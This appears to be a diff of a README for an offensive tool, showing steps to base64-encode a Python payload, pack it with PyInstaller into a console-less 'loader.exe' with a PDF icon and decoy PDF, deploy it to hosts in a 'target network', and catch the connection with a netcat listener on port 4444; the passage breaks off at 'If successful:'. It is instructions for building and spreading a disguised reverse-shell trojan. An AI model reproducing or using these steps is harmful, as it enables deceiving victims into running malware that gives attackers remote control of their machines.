@@ -46,26 +46,26 @@ port = 4444
 ### 2. Generate payload.b64
 
 From your terminal or PowerShell:
-
+```
 base64 payload.py > payload.b64
-
+```
 ✅ This will create a file named payload.b64 in the same folder.
 
 ### 3. Build the Executable with PyInstaller
-
+```
 pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "payload.b64;." --add-data "test.pdf;." loader.py
-
+```
 A new standalone executable will be created in the dist/ directory:
-
+```
 dist/loader.exe
-
+```
 ✅ This file can now be deployed to any host within the target network.
 
 🧪 To test it:
 Start a listener on your attacker machine:
-
-  nc -lvnp 4444
-
+```
+nc -lvnp 4444
+```
 Run loader.exe on the target machine.
 
 If successful:
